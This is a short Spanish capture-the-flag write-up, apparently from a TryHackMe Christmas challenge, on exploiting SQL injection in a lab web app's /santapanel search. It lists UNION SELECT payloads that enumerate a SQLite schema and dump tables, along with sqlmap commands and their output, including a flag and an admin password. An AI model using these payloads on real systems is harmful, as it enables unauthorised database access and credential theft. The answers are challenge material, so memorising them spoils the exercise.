
# SQLi

## Respuestas

/santapanel

http://10.10.64.187:8000/santapanel?search=hola%27+or+1%3D1+limit+100+--

22

github ownership

## Inyeccion sql


```
' UNION SELECT sqlite_version(), NULL--

' UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --
hidden_table
sequels
users

' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='hidden_table' --
' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users' --

' UNION SELECT 1,* from hidden_table  -- 
thmfox{All_I_Want_for_Christmas_Is_You

' UNION SELECT username, password from users  --

```


```
sqlmap -r req2 --dbms=sqlite --tamper=space2comment --level 3 --risk 3 --threads 9
```

```
sqlmap -r req2 --dbms=SQLite --tables
+--------------+
| hidden_table |
| sequels      |
| users        |
+--------------+
```

```
sqlmap -r req2 --dbms=SQLite -T hidden_table --dump --threads 9
thmfox{All_I_Want_for_Christmas_Is_You}
```

```
sqlmap -r req2 --dbms=SQLite -T users --dump --threads 9
+----------+------------------+
| username | password         |
+----------+------------------+
| admin    | EhCNSWzzFP6sc7gB |
+----------+------------------+
```


## Referencias

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
